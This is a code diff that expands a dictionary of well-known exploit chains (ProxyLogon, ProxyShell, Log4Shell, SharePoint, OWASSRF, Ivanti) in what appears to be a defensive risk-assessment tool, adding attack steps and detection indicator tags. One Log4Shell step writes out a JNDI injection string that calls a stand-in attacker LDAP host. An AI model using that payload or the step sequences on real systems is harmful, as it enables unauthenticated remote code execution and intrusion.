@@ -86,47 +86,90 @@ TYPE_MAP = {
 }
 
 NAMED_CHAINS = {
-    "ProxyLogon":    {
+    "ProxyLogon": {
         "name": "ProxyLogon (Exchange Full Compromise)",
+        "platform": "Exchange",
         "cves": ["CVE-2021-26855", "CVE-2021-26857", "CVE-2021-26858", "CVE-2021-27065"],
         "risk": "CRITICAL", "cvss": 9.8,
-        "description": "SSRF → NTLM authentication → Arbitrary file write → RCE",
+        "description": "SSRF via cookie header bypasses authentication (CVE-2021-26855), allowing access to the Exchange Control Panel. Combined with post-auth file write (CVE-2021-26858/27065) to drop a webshell.",
         "impact": "Full domain compromise, credential theft, ransomware deployment",
+        "steps": [
+            {"cve": "CVE-2021-26855", "action": "SSRF via X-AnonResource-Backend cookie — bypass authentication to reach Exchange Control Panel"},
+            {"cve": "CVE-2021-26857", "action": "Insecure deserialization in Unified Messaging service — execute code as SYSTEM"},
+            {"cve": "CVE-2021-26858", "action": "Post-auth arbitrary file write — drop webshell to disk"},
+            {"cve": "CVE-2021-27065", "action": "ECP endpoint file write — establish persistent backdoor access"},
+        ],
+        "indicator_tags": ["X-AnonResource-Backend", "/owa/auth/", "/ecp/", "webshell", "SYSTEM process"],
     },
-    "ProxyShell":    {
+    "ProxyShell": {
         "name": "ProxyShell (Exchange Pre-Auth RCE)",
+        "platform": "Exchange",
         "cves": ["CVE-2021-34473", "CVE-2021-34523", "CVE-2021-31207"],
         "risk": "CRITICAL", "cvss": 9.8,
-        "description": "URL confusion → RBAC bypass → Post-auth RCE",
+        "description": "URL path confusion allows unauthenticated access to ECP (CVE-2021-34473). RBAC bypass elevates to admin (CVE-2021-34523). Malicious email/module installs a webshell (CVE-2021-31207).",
         "impact": "Remote code execution as SYSTEM on Exchange server",
+        "steps": [
+            {"cve": "CVE-2021-34473", "action": "URL confusion via autodiscover endpoint — reach ECP without credentials"},
+            {"cve": "CVE-2021-34523", "action": "RBAC bypass in Exchange PowerShell backend — obtain admin privileges"},
+            {"cve": "CVE-2021-31207", "action": "Export malicious mailbox to drop webshell on disk"},
+        ],
+        "indicator_tags": ["/autodiscover/", "/ecp/y.js", "X-BEResource", "mailbox export"],
     },
-    "Log4Shell":     {
+    "Log4Shell": {
         "name": "Log4Shell (Log4j Remote Code Execution)",
+        "platform": "Log4j",
         "cves": ["CVE-2021-44228", "CVE-2021-45046"],
         "risk": "CRITICAL", "cvss": 10.0,
-        "description": "JNDI lookup via log message → LDAP/RMI callback → Class loading → RCE",
-        "impact": "Full server compromise without authentication",
+        "description": "Attacker injects a JNDI lookup string into any logged field (User-Agent, X-Api-Version, etc.). Log4j resolves it via LDAP/RMI, loading a remote class that executes arbitrary code on the server.",
+        "impact": "Full server compromise without authentication — affects any Java app using Log4j 2.0-2.14.1",
+        "steps": [
+            {"cve": "CVE-2021-44228", "action": "Inject ${jndi:ldap://attacker.com/a} into any HTTP header or request field"},
+            {"cve": "CVE-2021-44228", "action": "Log4j resolves the JNDI lookup, connects to attacker LDAP server"},
+            {"cve": "CVE-2021-45046", "action": "Bypass incomplete patch via context lookup obfuscation"},
+            {"cve": "CVE-2021-44228", "action": "Attacker's LDAP returns malicious Java class — arbitrary code executes as JVM user"},
+        ],
+        "indicator_tags": ["jndi:", "ldap://", "rmi://", "${lower:", "log4j", "X-Api-Version"],
     },
-    "SharePoint_RCE":{
+    "SharePoint_RCE": {
         "name": "SharePoint EoP + RCE Chain",
+        "platform": "SharePoint",
         "cves": ["CVE-2023-29357", "CVE-2023-24955"],
         "risk": "CRITICAL", "cvss": 9.8,
-        "description": "Pre-auth privilege escalation → Authenticated RCE",
-        "impact": "Remote code execution as SharePoint service account",
+        "description": "Forged JWT token bypasses authentication and grants admin privileges (CVE-2023-29357). Authenticated RCE via server-side injection in page content (CVE-2023-24955).",
+        "impact": "Remote code execution as SharePoint service account, full farm compromise",
+        "steps": [
+            {"cve": "CVE-2023-29357", "action": "Forge JWT token with algorithm:none — gain admin access without credentials"},
+            {"cve": "CVE-2023-29357", "action": "Access /_api/web as admin — enumerate users and site data"},
+            {"cve": "CVE-2023-24955", "action": "Inject server-side payload via site page modification — achieve RCE"},
+        ],
+        "indicator_tags": ["/_api/web", "JWT none algorithm", "/_layouts/15/", "SharePoint service account"],
     },
-    "OWASSRF":       {
+    "OWASSRF": {
         "name": "OWASSRF (Exchange SSRF + RCE)",
+        "platform": "Exchange",
         "cves": ["CVE-2022-41040", "CVE-2022-41082"],
         "risk": "CRITICAL", "cvss": 9.8,
-        "description": "SSRF via autodiscover → PowerShell RCE",
-        "impact": "Remote code execution on Exchange server",
+        "description": "SSRF via autodiscover endpoint (CVE-2022-41040) reaches Exchange PowerShell backend. Remote code execution via PowerShell remoting (CVE-2022-41082) achieves SYSTEM-level access.",
+        "impact": "Remote code execution on Exchange server — used by PLAY and BLACKCAT ransomware groups",
+        "steps": [
+            {"cve": "CVE-2022-41040", "action": "SSRF via /autodiscover/autodiscover.json — reach internal PowerShell endpoint"},
+            {"cve": "CVE-2022-41082", "action": "Execute PowerShell commands via remoting — achieve RCE as NETWORK SERVICE"},
+        ],
+        "indicator_tags": ["/autodiscover/", "PowerShell remoting", "NETWORK SERVICE", "Exchange backend"],
     },
-    "Ivanti_RCE":    {
+    "Ivanti_RCE": {
         "name": "Ivanti Connect Secure RCE Chain",
+        "platform": "Ivanti",
         "cves": ["CVE-2024-21887", "CVE-2023-46805"],
         "risk": "CRITICAL", "cvss": 10.0,
-        "description": "Auth bypass → Command injection → System compromise",
-        "impact": "Full VPN appliance compromise, lateral movement into internal network",
+        "description": "Authentication bypass via path traversal (CVE-2023-46805) allows unauthenticated access to admin endpoints. Command injection in the web interface (CVE-2024-21887) achieves OS command execution.",
+        "impact": "Full VPN appliance compromise — lateral movement into internal network, credential harvesting",
+        "steps": [
+            {"cve": "CVE-2023-46805", "action": "Bypass authentication via path traversal in /api/v1 endpoint"},
+            {"cve": "CVE-2024-21887", "action": "Inject OS commands via /api/v1/totp/user-backup-code endpoint"},
+            {"cve": "CVE-2024-21887", "action": "Execute payload as root — extract credentials and pivot to internal network"},
+        ],
+        "indicator_tags": ["/api/v1/", "path traversal", "command injection", "root execution", "VPN appliance"],
     },
 }
 
